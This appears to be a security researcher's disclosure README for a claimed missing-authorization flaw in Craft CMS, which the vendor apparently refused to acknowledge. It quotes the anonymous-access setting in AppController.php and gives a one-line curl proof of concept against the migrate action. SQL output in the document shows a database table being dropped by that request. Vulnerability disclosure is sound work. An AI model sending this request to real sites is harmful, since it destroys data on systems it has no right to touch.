# Craft CMS CVE - Missing Authorization

## Evidence Contents
- `screenshots/` - Proof of Concept demonstrations
- `vendor_refusal/` - Vendor refusal evidence

## Vulnerability
- Type: Missing Authorization
- Impact: Authentication Bypass
- Vendor: Craft CMS
- Status: Vendor refused to acknowledge

## Contact
- Researcher: 0xRIXET
- Email: 0xrixet@gmail.com

## Vulnerable Code

File: `src/controllers/AppController.php`

Lines 65-68:
```php
protected array|bool|int $allowAnonymous = [
    'migrate' => self::ALLOW_ANONYMOUS_LIVE | self::ALLOW_ANONYMOUS_OFFLINE,
];
```

## Proof of Concept
```bash
# With allowAdminChanges=false
curl -X POST "http://target/actions/app/migrate"
```

## Evidence

### Before Attack:
```sql
mysql> SELECT COUNT(*) FROM sessions;
+----------+
| COUNT(*) |
+----------+
|        0 |
+----------+
```

### After Attack:
```sql
mysql> SELECT COUNT(*) FROM sessions;
ERROR 1146 (42S02): Table 'sessions' doesn't exist

